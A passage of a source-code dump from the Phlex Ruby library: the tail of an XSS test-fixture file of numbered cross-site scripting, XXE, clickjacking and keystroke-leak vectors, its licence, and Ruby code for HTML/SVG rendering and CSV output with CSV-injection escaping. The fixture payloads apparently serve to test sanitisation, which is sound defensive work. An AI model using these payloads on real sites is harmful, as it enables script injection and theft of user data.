6418 | <div id="54"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'`-->]]>]</div><div id="55"><video><source onerror="alert(55)">//["'`-->]]>]</div><div id="56"><video onerror="alert(56)"><source></source></video>//["'`-->]]>]</div><div id="57"><b <script>alert(57)//</script>0</script></b>//["'`-->]]>]</div><div id="58"><b><script<b></b><alert(58)</script </b></b>//["'`-->]]>]</div><div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["'`-->]]>]</div><div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["'`-->]]>]</div>
6419 | <div id="61"><div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>//["'`-->]]>]</div>
6420 | <div id="62"><!-- IE 6-8 -->
6421 | <x '="foo"><x foo='><img src=x onerror=alert(62)//'>
6422 | <!-- IE 6-9 -->
6423 | <! '="foo"><x foo='><img src=x onerror=alert(2)//'>
6424 | <? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>
6425 | <div id="63"><embed src="javascript:alert(63)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF
6426 | <img src="javascript:alert(2)">
6427 | <image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓
6428 | <script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓//["'`-->]]>]</div>
6429 | <div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div><div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div>
6430 | <div id="66"><?xml version="1.0"?>
6431 | <?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
6432 | <root/>//["'`-->]]>]</div>
6433 | <div id="67"><!DOCTYPE x [   <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x"onerror CDATA "alert(67)"onload CDATA "alert(2)">]><img />//["'`-->]]>]</div>
6434 | <div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">   <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x></doc>//["'`-->]]>]</div>
6435 | <div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div><div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'`-->]]>]</div><div id="71"><// style=x:expression\28alert(71)\29>//["'`-->]]>]</div><div id="72"><form><button formaction="javascript:alert(72)">X</button>//["'`-->]]>]</div><div id="73"><event-source src="event.php" onload="alert(73)">//["'`-->]]>]</div><div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>//["'`-->]]>]</div><div id="75"><script<{alert(75)}/></script </>//["'`-->]]>]</div><div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["'`-->]]>]</div><div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'`-->]]>]</div><div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div><div id="79"><object allowscriptaccess="always" data="test.swf"></object>//["'`-->]]>]</div><div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'`-->]]>]</div><div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["'`-->]]>]</div><div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div>
6436 | <div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>
6437 | <div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["'`-->]]>]</div><div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div><div id="86"><body oninput=alert(86)><input autofocus>//["'`-->]]>]</div>
6438 | <div id="87"><svg xmlns="http://www.w3.org/2000/svg">
6439 | <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
6440 | </svg>//["'`-->]]>]</div>
6441 | <div id="88"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
6442 | <animation xlink:href="javascript:alert(88)"/>
6443 | <animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>
6444 | <image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>
6445 | <foreignObject xlink:href="javascript:alert(88)"/>
6446 | <foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E"/>
6447 | </svg>//["'`-->]]>]</div>
6448 | <div id="89"><svg xmlns="http://www.w3.org/2000/svg">
6449 | <set attributeName="onmouseover" to="alert(89)"/>
6450 | <animate attributeName="onunload" to="alert(89)"/>
6451 | </svg>//["'`-->]]>]</div>
6452 | <div id="90"><!-- Up to Opera 10.63 -->
6453 | <div style=content:url(test2.svg)></div>
6454 | <!-- Up to Opera 11.64 - see link below -->
6455 | <!-- Up to Opera 12.x -->
6456 | <div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>
6457 | <div id="91">[A]
6458 | <? foo="><script>alert(91)</script>">
6459 | <! foo="><script>alert(91)</script>">
6460 | </ foo="><script>alert(91)</script>">
6461 | <? foo="><x foo='?><script>alert(91)</script>'>">
6462 | <! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">
6463 | <% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>
6464 | <div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="93"><div style="list-style:url(http://foo.f)\20url(javascript:alert(93));">X</div>//["'`-->]]>]</div>
6465 | <div id="94"><svg xmlns="http://www.w3.org/2000/svg">
6466 | <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
6467 | </svg>//["'`-->]]>]</div>
6468 | <div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
6469 | <feImage><set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/></feImage>
6470 | </svg>//["'`-->]]>]</div>
6471 | <div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
6472 | <iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>
6473 | <div id="97"><!-- IE 5-9 -->
6474 | <div id=d><x xmlns="><iframe onload=alert(97)"></div>
6475 | <script>d.innerHTML+='';</script>
6476 | <!-- IE 10 in IE5-9 Standards mode -->
6477 | <div id=d><x xmlns='"><iframe onload=alert(2)//'></div>
6478 | <script>d.innerHTML+='';</script>//["'`-->]]>]</div>
6479 | <div id="98"><div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div>
6480 | <script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>
6481 | <div id="99">XXX<style>
6482 | *{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */
6483 | <!--
6484 | --><!--*{color:red}   /* all UA */
6485 | *{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */
6486 | </style>//["'`-->]]>]</div>
6487 | <div id="100"><img[a][b]src=x[d]onerror[c]=[e]"alert(100)">//["'`-->]]>]</div><div id="101"><a href="[a]java[b]script[c]:alert(101)">XXX</a>//["'`-->]]>]</div><div id="102"><img src="x` `<script>alert(102)</script>"` `>//["'`-->]]>]</div><div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div>
6488 | <div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
6489 | <x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
6490 | </svg>//["'`-->]]>]</div>
6491 | <div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div><div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
6492 | <div id="108"><!-- IE 5-8 standards mode -->
6493 | <a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(108)></a>">
6494 | <!-- IE 5-9 standards mode -->
6495 | <!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//">
6496 | <?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>
6497 | <div id="109"><svg xmlns="http://www.w3.org/2000/svg">
6498 | <a id="x"><rect fill="white" width="1000" height="1000"/></a>
6499 | <rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
6500 | </svg>//["'`-->]]>]</div>
6501 | <div id="110"><svg xmlns="http://www.w3.org/2000/svg">
6502 | <path d="M0,0" style="marker-start:url(test4.svg#a)"/>
6503 | </svg>//["'`-->]]>]</div>
6504 | <div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
6505 | <div id="113"><div id="x">XXX</div>
6506 | <style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>//["'`-->]]>]</div>
6507 | <div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div>
6508 | <div id="115"><!--[if]><script>alert(115)</script -->
6509 | <!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>
6510 | <div id="116"><div id="x">x</div>
6511 | <xml:namespace prefix="t">
6512 | <import namespace="t" implementation="#default#time2">
6513 | <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;">//["'`-->]]>]</div>
6514 | <div id="117"><a href="http://attacker.org">
6515 | <iframe src="http://example.org/"></iframe>
6516 | </a>//["'`-->]]>]</div>
6517 | <div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');"><h1>Drop me</h1></div>
6518 | <iframe src="http://www.example.org/dropHere.html"></iframe>//["'`-->]]>]</div>
6519 | <div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>
6520 | <textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>
6521 | <div id="120"><script>function makePopups(){for (i=1;i<6;i++) {window.open('popup.html','spam'+i,'width=50,height=50');}}</script>
6522 | <body><a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
6523 | <div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
6524 | xmlns:svg="http://www.w3.org/2000/svg">
6525 | <body style="background:gray">
6526 | <iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>
6527 | <svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"><svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/><svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body>
6528 | </html>//["'`-->]]>]</div>
6529 | <div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
6530 | <div id="123"><span class=foo>Some text</span>
6531 | <a class=bar href="http://www.example.org">www.example.org</a>
6532 | <script src="http://code.jquery.com/jquery-1.4.4.js"></script>
6533 | <script>$("span.foo").click(function() {alert('foo');$("a.bar").click();});$("a.bar").click(function() {alert('bar');location="http://html5sec.org";});</script>//["'`-->]]>]</div>
6534 | <div id="124"><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10
6535 | <script src="\\example.com\foo.js"></script> // Safari 5.0//["'`-->]]>]</div>
6536 | <div id="125"><?xml version="1.0"?>
6537 | <?xml-stylesheet type="text/xml" href="#stylesheet"?>
6538 | <!DOCTYPE doc [
6539 | <!ATTLIST xsl:stylesheet id    ID    #REQUIRED>]>
6540 | <svg xmlns="http://www.w3.org/2000/svg">
6541 | <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/"><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>        </xsl:template></xsl:stylesheet><circle fill="red" r="40"></circle></svg>//["'`-->]]>]</div>
6542 | <div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
6543 | <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>
6544 | <div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
6545 | <listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
6546 | <handler id="y">alert(127)</handler>
6547 | </svg>//["'`-->]]>]</div>
6548 | <div id="128"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>
6549 | <div id="129"><svg>
6550 | <image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>
6551 | </svg>//["'`-->]]>]</div>
6552 | <div id="130"><math href="javascript:alert(130)">CLICKME</math>
6553 | <math>
6554 | <maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>
6555 | <maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
6556 | </math>//["'`-->]]>]</div>
6557 | <div id="131"><b>drag and drop one of the following strings to the drop box:</b>
6558 | <br/><hr/>jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>
6559 | feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>
6560 | feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>
6561 | <br/><hr/>feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>
6562 | <div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>//["'`-->]]>]</div>
6563 | <div id="132"><!doctype html>
6564 | <form>
6565 | <label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
6566 | <br>
6567 | <input name="secret" type="password">
6568 | </form>
6569 | <!-- injection --><svg height="50px">
6570 | <image xmlns:xlink="http://www.w3.org/1999/xlink">
6571 | <set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
6572 | <set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
6573 | <set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
6574 | <set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
6575 | </image>
6576 | </svg>//["'`-->]]>]</div>
6577 | <div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>
6578 | <div id="134"><xmp>
6579 | <%
6580 | </xmp>
6581 | <img alt='%></xmp><img src=xx:x onerror=aler
6582 | *{color:red}</style>//["'`-->]]>]</div>
6583 | <div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
6584 | <stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
6585 | <template match="/">
6586 | <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval>
6587 | <if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
6588 | </template>
6589 | </stylesheet>//["'`-->]]>]</div>
6590 | <div id="136"><form action="" method="post">
6591 | <input name="username" value="admin" />
6592 | <input name="password" type="password" value="secret" />
6593 | <input name="injected" value="injected" dirname="password" />
6594 | <input type="submit">
6595 | </form>//["'`-->]]>]</div>
6596 | <div id="137"><svg>
6597 | <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
6598 | <circle r="400"></circle>
6599 | <animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
6600 | </a>//["'`-->]]>]</div>
6601 | <div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined
6602 | <marquee loop=1 width=0 onfinish=alert(1)>
6603 | <marguee/onstart=alert(1)>
6604 | <svg onload=(alert)(1)>
6605 | <script>$=1,alert($)</script>
6606 | <form><button formaction="javascript:alert(1)">
6607 | <div style=xss:expression(alert(1))>
6608 | <div style=xss:expression(1)-alert(1)>
6609 | <div style=xss:expressio\6e(alert(1))>
6610 | <div style=xss:expressio\006e(alert(1))>
6611 | <div style=xss:expressio\00006e(alert(1))>
6612 | <div style=xss:expressio\6e(alert(1))>
6613 | <div style=xss:expressio&#x5c;6e(alert(1))>
6614 |


--------------------------------------------------------------------------------
/fixtures/xss/LICENSE.txt:
--------------------------------------------------------------------------------
 1 | MIT License
 2 |
 3 | Copyright (c) 2018 İsmail Taşdelen
 4 |
 5 | Permission is hereby granted, free of charge, to any person obtaining a copy
 6 | of this software and associated documentation files (the "Software"), to deal
 7 | in the Software without restriction, including without limitation the rights
 8 | to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 9 | copies of the Software, and to permit persons to whom the Software is
10 | furnished to do so, subject to the following conditions:
11 |
12 | The above copyright notice and this permission notice shall be included in all
13 | copies or substantial portions of the Software.
14 |
15 | THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
16 | IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
17 | FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
18 | AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
19 | LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
20 | OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
21 | SOFTWARE.
22 |


--------------------------------------------------------------------------------
/lib/phlex.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | require "erb"
 4 | require "set"
 5 | require "zeitwerk"
 6 |
 7 | module Phlex
 8 | 	Loader = Zeitwerk::Loader.for_gem.tap do |loader|
 9 | 		loader.inflector.inflect(
10 | 			"csv" => "CSV",
11 | 			"fifo" => "FIFO",
12 | 			"fifo_cache_store" => "FIFOCacheStore",
13 | 			"html" => "HTML",
14 | 			"sgml" => "SGML",
15 | 			"svg" => "SVG",
16 | 		)
17 |
18 | 		loader.collapse("#{__dir__}/phlex/errors")
19 | 		loader.setup
20 | 	end
21 |
22 | 	Escape = ERB::Escape
23 |
24 | 	DEPLOYED_AT = Process.clock_gettime(Process::CLOCK_MONOTONIC, :millisecond)
25 | 	CACHED_FILES = Set.new
26 | 	ATTRIBUTE_CACHE = FIFO.new
27 |
28 | 	def self.__expand_attribute_cache__(file_path)
29 | 		unless CACHED_FILES.include?(file_path)
30 | 			CACHED_FILES << file_path
31 | 			Phlex::ATTRIBUTE_CACHE.expand(File.size(file_path))
32 | 		end
33 | 	end
34 |
35 | 	# Generate an HTML string using Phlex’ HTML DSL
36 | 	def self.html(&block)
37 | 		HTML.call do |component|
38 | 			receiver = block.binding.receiver
39 |
40 | 			receiver.instance_variables.each do |ivar|
41 | 				next if component.instance_variable_defined?(ivar)
42 |
43 | 				value = receiver.instance_variable_get(ivar)
44 | 				component.instance_variable_set(ivar, value)
45 | 			end
46 |
47 | 			component.instance_exec(receiver, &block)
48 | 		end
49 | 	end
50 |
51 | 	# Generate an SVG string using Phlex’ SVG DSL
52 | 	def self.svg(&block)
53 | 		SVG.call do |component|
54 | 			receiver = block.binding.receiver
55 |
56 | 			receiver.instance_variables.each do |ivar|
57 | 				next if component.instance_variable_defined?(ivar)
58 |
59 | 				value = receiver.instance_variable_get(ivar)
60 | 				component.instance_variable_set(ivar, value)
61 | 			end
62 |
63 | 			component.instance_exec(receiver, &block)
64 | 		end
65 | 	end
66 | end
67 |
68 | def 💪
69 | 	Phlex
70 | end
71 |


--------------------------------------------------------------------------------
/lib/phlex/csv.rb:
--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | class Phlex::CSV
  4 | 	FORMULA_PREFIXES_MAP = Array.new(128).tap do |map|
  5 | 		"=+-@\t\r".each_byte do |byte|
  6 | 			map[byte] = true
  7 | 		end
  8 | 	end.freeze
  9 |
 10 | 	UNDEFINED = Object.new
 11 |
 12 | 	def initialize(collection)
 13 | 		@collection = collection
 14 | 		@_row_buffer = []
 15 | 		@_headers = []
 16 | 		@_row_appender = nil
 17 | 	end
 18 |
 19 | 	attr_reader :collection
 20 |
 21 | 	def call(buffer = +"", context: nil, delimiter: self.delimiter)
 22 | 		ensure_escape_csv_injection_configured!
 23 |
 24 | 		strip_whitespace = trim_whitespace?
 25 | 		escape_csv_injection = escape_csv_injection?
 26 | 		row_buffer = @_row_buffer
 27 | 		headers = @_headers
 28 | 		has_yielder = respond_to?(:yielder, true)
 29 | 		first_row = true
 30 | 		render_headers = render_headers?
 31 |
 32 | 		if delimiter.length != 1
 33 | 			raise Phlex::ArgumentError.new("Delimiter must be a single character")
 34 | 		end
 35 |
 36 | 		if strip_whitespace
 37 | 			escape_regex = /[\n"#{delimiter}]/
 38 | 		else
 39 | 			escape_regex = /^\s|\s$|[\n"#{delimiter}]/
 40 | 		end
 41 |
 42 | 		if has_yielder
 43 | 			warn <<~MESSAGE
 44 | 				Custom yielders are deprecated in Phlex::CSV.
 45 |
 46 | 				Please replace your yielder with an `around_row` method.
 47 |
 48 | 				You should be able to just rename your yielder method
 49 | 				and change `yield` to `super`.
 50 | 			MESSAGE
 51 | 		end
 52 |
 53 | 		row_appender = -> {
 54 | 			row = row_buffer
 55 |
 56 | 			if first_row
 57 | 				first_row = false
 58 |
 59 | 				i = 0
 60 | 				number_of_columns = row.length
 61 | 				first_col = true
 62 |
 63 | 				while i < number_of_columns
 64 | 					header, = row[i]
 65 | 					headers[i] = header
 66 |
 67 | 					if render_headers
 68 | 						if first_col
 69 | 							first_col = false
 70 | 						else
 71 | 							buffer << delimiter
 72 | 						end
 73 |
 74 | 						__escape__(buffer, header, escape_csv_injection:, strip_whitespace:, escape_regex:)
 75 | 					end
 76 | 					i += 1
 77 | 				end
 78 |
 79 | 				buffer << "\n" if render_headers
 80 | 			end
 81 |
 82 | 			i = 0
 83 | 			number_of_columns = row.length
 84 | 			first_col = true
 85 |
 86 | 			while i < number_of_columns
 87 | 				header, value = row[i]
 88 |
 89 | 				unless headers[i] == header
 90 | 					raise Phlex::RuntimeError.new("Header mismatch at index #{i}: expected #{headers[i]}, got #{header}.")
 91 | 				end
 92 |
 93 | 				if first_col
 94 | 					first_col = false
 95 | 				else
 96 | 					buffer << delimiter
 97 | 				end
 98 |
 99 | 				__escape__(buffer, value, escape_csv_injection:, strip_whitespace:, escape_regex:)
100 | 				i += 1
101 | 			end
102 |
103 | 			buffer << "\n"
104 |
105 | 			row_buffer.clear
106 | 		}
107 |
108 | 		if has_yielder
109 | 			each_item do |record|
110 | 				yielder(record) do |*a, **k|
111 | 					row_template(*a, **k)
112 | 					row_appender.call
113 | 				end
114 | 			end
115 | 		else
116 | 			@row_appender = row_appender
117 | 			each_item do |record|
118 | 				around_row(record)
119 | 			end
120 | 		end
121 |
122 | 		buffer
123 | 	end
124 |
125 | 	def around_row(...)
126 | 		row_template(...)
127 | 		@row_appender.call
128 | 	end
129 |
130 | 	def filename
131 | 		nil
132 | 	end
133 |
134 | 	def content_type
135 | 		"text/csv"
136 | 	end
137 |
138 | 	def delimiter
139 | 		","
140 | 	end
141 |
142 | 	private def column(header = nil, value)
143 | 		@_row_buffer << [header, value]
144 | 	end
145 |
146 | 	private def each_item(&)
147 | 		collection.each(&)
148 | 	end
149 |
150 | 	# Override and set to `false` to disable rendering headers.
151 | 	private def render_headers?
152 | 		true
153 | 	end
154 |
155 | 	# Override and set to `true` to strip leading and trailing whitespace from values.
156 | 	private def trim_whitespace?
157 | 		false
158 | 	end
159 |
160 | 	# Override and set to `false` to disable CSV injection escapes or `true` to enable.
161 | 	private def escape_csv_injection?
162 | 		UNDEFINED
163 | 	end
164 |
165 | 	private def __escape__(buffer, value, escape_csv_injection:, strip_whitespace:, escape_regex:)
166 | 		value = case value
167 | 		when String
168 | 			value
169 | 		when Symbol
170 | 			value.name
171 | 		else
172 | 			value.to_s
173 | 		end
174 |
175 | 		if strip_whitespace
176 | 			value = value.strip
177 |
178 | 			if escape_csv_injection
179 | 				if value.empty?
180 | 					buffer << value
181 | 				elsif FORMULA_PREFIXES_MAP[value.getbyte(0)]
182 | 					value.gsub!('"', '""')
183 | 					buffer << '"\'' << value << '"'
184 | 				elsif value.match?(escape_regex)
185 | 					value.gsub!('"', '""')
186 | 					buffer << '"' << value << '"'
187 | 				else
188 | 					buffer << value
189 | 				end
190 | 			else # not escaping CSV injection
191 | 				buffer << value
192 | 			end
193 | 		else # not stripping whitespace
194 | 			if escape_csv_injection
195 | 				first_byte = value.getbyte(0)
196 |
197 | 				if value.empty?
198 | 					buffer << '""'
199 | 				elsif FORMULA_PREFIXES_MAP[first_byte]
200 | 					buffer << '"\'' << value.gsub('"', '""') << '"'
201 | 				elsif value.match?(escape_regex)
202 | 					buffer << '"' << value.gsub('"', '""') << '"'
203 | 				else
204 | 					buffer << value
205 | 				end
206 | 			else # not escaping CSV injection
207 | 				if value.empty?
208 | 					buffer << '""'
209 | 				elsif value.match?(escape_regex)
210 | 					buffer << '"' << value.gsub('"', '""') << '"'
211 | 				else
212 | 					buffer << value
213 | 				end
214 | 			end
215 | 		end
216 | 	end
217 |
218 | 	# Handle legacy `view_template` method
219 | 	private def respond_to_missing?(method_name, include_private)
220 | 		(method_name == :row_template && respond_to?(:view_template)) || super
221 | 	end
222 |
223 | 	# Handle legacy `view_template` method
224 | 	private def method_missing(method_name, ...)
225 | 		if method_name == :row_template && respond_to?(:view_template)
226 | 			warn "Deprecated: Use `row_template` instead of `view_template` in Phlex CSVs."
227 | 			self.class.alias_method :row_template, :view_template
228 | 			view_template(...)
229 | 		else
230 | 			super
231 | 		end
232 | 	end
233 |
234 | 	private def ensure_escape_csv_injection_configured!
235 | 		if escape_csv_injection? == UNDEFINED
236 | 			raise <<~MESSAGE
237 | 				You need to define `escape_csv_injection?` in #{self.class.name}.
238 |
239 | 				CSV injection is a security vulnerability where malicious spreadsheet
240 | 				formulae are used to execute code or exfiltrate data when a CSV is opened
241 | 				in a spreadsheet program such as Microsoft Excel or Google Sheets.
242 |
243 | 				For more information, see https://owasp.org/www-community/attacks/CSV_Injection
244 |
245 | 				If you’re sure this CSV will never be opened in a spreadsheet program,
246 | 				you can *disable* CSV injection escapes:
247 |
248 | 				  def escape_csv_injection? = false
249 |
250 | 				This is useful when using CSVs for byte-for-byte data exchange between secure systems.
251 |
252 | 				Alternatively, you can *enable* CSV injection escapes at the cost of data integrity:
253 |
254 | 				  def escape_csv_injection? = true
255 |
256 | 				Enabling the CSV injection escapes will prefix with a single quote `'` any
257 | 				values that start with: `=`, `+`, `-`, `@`, `\\t`, `\\r`
258 |
259 | 				Unfortunately, there is no one-size-fits-all solution to CSV injection.
260 |
261 | 				You need to decide based on your specific use case.
262 | 			MESSAGE
263 | 		end
264 | 	end
265 | end
266 |


--------------------------------------------------------------------------------
/lib/phlex/error.rb:
